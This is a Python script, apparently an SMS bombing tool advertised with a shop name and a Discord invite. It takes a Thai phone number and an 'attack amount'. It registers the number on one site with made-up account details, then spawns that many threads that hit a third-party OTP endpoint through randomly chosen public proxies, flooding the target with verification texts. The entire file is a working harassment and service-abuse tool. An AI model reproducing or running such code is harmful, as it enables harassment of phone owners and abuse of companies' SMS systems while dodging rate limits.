import requests as ru
import threading
import requests
import time
import random
import os
import asyncio
from re import search
from requests import Session
from user_agent import generate_user_agent

# ล้างหน้าจอ
os.system("clear")

# กำหนด Header และ Proxy
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
with open("proxy.txt", "w") as f:
    f.write(proxy)
with open("proxy.txt", "r") as g:
    s = g.read().splitlines()


# ฟังก์ชันหลัก
async def home():
    print('''
   ▄████  █    ██   ███▄ ▄███▓ ▄▄▄      ██▀███   █    ██  ███▄    █ 
▒ ██▒ ▀█▒ ██  ▓██▒ ▓██▒▀█▀ ██▒▒████▄   ▓██ ▒ ██▒ ██  ▓██▒ ██ ▀█   █ 
░▒██░▄▄▄░▓██  ▒██░ ▓██    ▓██░▒██  ▀█▄ ▓██ ░▄█ ▒▓██  ▒██░▓██  ▀█ ██▒
░░▓█  ██▓▓▓█  ░██░ ▒██    ▒██ ░██▄▄▄▄██▒██▀▀█▄  ▓▓█  ░██░▓██▒  ▐▌██▒
░▒▓███▀▒░▒▒█████▓ ▒▒██▒   ░██▒ ▓█   ▓██░██▓ ▒██▒▒▒█████▓ ▒██░   ▓██░
 ░▒   ▒   ▒▓▒ ▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ 
  ░   ░   ░▒░ ░ ░ ░░  ░      ░  ░   ▒▒   ░▒ ░ ▒░ ░▒░ ░ ░ ░ ░░   ░ ▒░
░ ░   ░ ░  ░░ ░ ░  ░      ░     ░   ▒     ░   ░   ░░ ░ ░    ░   ░ ░ 
      ░     ░     ░       ░         ░     ░        ░              ░ 
                                    [Gumarun shop]
                          [https://discord.com/invite/hSbDP5Rmc8] 
    ''')
    phone = input(" \x1b[96m[PHONE-NUMBER]  : \x1b[92m")

    if int(phone) <= 99999999 or int(phone) >= 999999999:
        print()
        print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mEnter a Thailand phone number [ ! ] \x1b[00m')
        time.sleep(1)
        os.system('clear')
    else:
        jam = int(input("\x1b[96m [AMOUNT-ATTACK] : \x1b[92m"))
        print()
        print()

        ru.post(
            "https://www.tgfone.com/signin/add_register",
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": generate_user_agent(),
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71"
            },
            data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2"
        )

        for _ in range(jam):
            threading.Thread(target=api1, args=(phone,)).start()


def api1(phone):
    send = Session()
    send.headers.update({
        "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
    })
    sms = send.post(
        "https://api.jobbkk.com/v1/easy/otp_code",
        data=f"mobile={phone}",
        proxies={'http': 'http://' + random.choice(s)}
    )
    print(f"\x1b[92m{sms}")